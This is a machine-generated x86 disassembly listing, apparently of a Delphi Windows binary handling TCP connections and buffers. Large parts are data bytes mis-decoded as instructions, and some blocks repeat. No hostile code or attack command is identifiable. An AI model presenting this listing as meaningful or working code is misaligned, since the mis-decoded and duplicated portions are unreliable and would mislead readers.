inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x0
add [ eax ] dl
inc eax
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ ebp + esi * 2 + 0x79200046 ] al
inc esi
add [ eax - 0x47ffb987 ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000c ] al
outsb
push edi
outsd
jb r-xdata
jb r-xdata
push esp
adc [ eax ] al
pushfd
add [ eax ] al
[ eax + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or edx [ edx + 0x65 ]
popad
push esp
imul ebp [ ebp + 0x65 ] 0x5474756f
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x80
add [ eax ] al
or [ eax ] eax
push cs
push edx
arpl [ gs : esi + 0x42 ] si
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x53 ]
inc ebx
dec ecx
dec ecx
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x462e5872
add [ eax ] bh
add bh bh
sbb [ ebp + 0x46 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090004 ] al
outsb
je r-xdata
add [ eax ] al
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] dl
push esp
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
sub al 0x67
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
imul eax [ esi ] 0xc
les esi [ esi + eax * 2 ]
add [ eax ] al
push 0x38004635
imul edi [ edx + 0x65 ] r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8000 ] al
or al [ eax ]
push cs
push ebx
outsb
inc edx
jne r-xdata
inc esi
add [ eax + eax + 0x84ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x4c78614d ] cl
inc esi
add [ eax + eax ] bh
[ esi * 2 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x6a
outsd
jb r-xdata
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x54644945 ] dl
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc eax
add al bl
inc edx
imul ebp [ gs : bp + 0x24 ] 0x48004635
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
or [ 0x6e4f0b00 ] 0x57
jb r-xdata
hlt
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
rcl ah 0x69
inc esi
add [ eax ] al
add [ eax ] al
and al 0x69
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] bl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x69
inc esi
add [ eax + eax ] cl
add [ eax ] al
inc ebp
outsb
jo r-xdata
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
push edi
add [ eax ] al
imul edi [ edx + 0x65 ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000b ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ ebp + 0x64 ] si
push 0x38004635
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
hlt
xor eax [ eax ]
jl r-xdata
outsb
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
imul eax [ esi ] 0xc
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg [ ebx + 0x46 ] ebp
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466b9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_466b80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00466a ] bl
add [ eax ] al
add [ ecx + ebp * 2 ] ah
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
inc eax
outsd
push edx
popad
cwde
push 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
push 0x46
add [ eax + eax ] cl
add [ eax ] al
and al 0x69
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466d4c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4041c0
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b87
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
and al 0x69
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
inc eax
add [ edx + ebp * 2 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] bh
sub_4668c1
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
dec edi
outsb
push edi
outsd
jb r-xdata
imul eax [ esi ] 0xc
les esi [ esi + eax * 2 ]
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
push edi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x6a
outsd
jb r-xdata
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x54644945 ] dl
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc eax
add al bl
inc edx
imul ebp [ gs : bp + 0x24 ] 0x48004635
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
hlt
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
rcl ah 0x69
inc esi
add [ eax ] al
add [ eax ] al
and al 0x69
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] bl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x69
inc esi
add [ eax + eax ] cl
add [ eax ] al
inc ebp
outsb
jo r-xdata
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
hlt
xor eax [ eax ]
jl r-xdata
outsb
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
imul eax [ esi ] 0xc
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg [ ebx + 0x46 ] ebp
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466b9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_466b80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00466a ] bl
add [ eax ] al
add [ ecx + ebp * 2 ] ah
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
inc eax
outsd
push edx
popad
cwde
push 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
push 0x46
add [ eax + eax ] cl
add [ eax ] al
and al 0x69
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466d4c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4041c0
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b87
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
and al 0x69
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
inc eax
add [ edx + ebp * 2 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] bh
sub_466aac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_466bac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_466c70
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c77
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_4637c0
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_466c80
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_466ca8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4636a8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464ea4
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464ea4
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_467bdc
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_467f48
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_466d4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403ef8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_466d8c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d1c0
lea eax [ esi + 0xa4 ]
call sub_40d1c0
lea eax [ esi + 0x80 ]
call sub_40d1c0
lea eax [ esi + 0x6c ]
call sub_40d1c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_463740
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d1c0
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_466df0
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_4637c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_4637c0
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d1c0
mov [ ebx + 0x70 ] 0x0
sub_466e48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_467de8
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_466e70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466ec1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466ec8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_466ed0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_466f26
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f388
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f2d
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_466f34
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4671cc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4671d3
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_4166e4
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_460b70
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_4166e4
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_416680
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_4168c4
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460c24
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_4671e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_4673fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_46802c
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4629a0
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4041b8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404304
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_404544
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_403ef8
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467405
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp + 0x8 ]
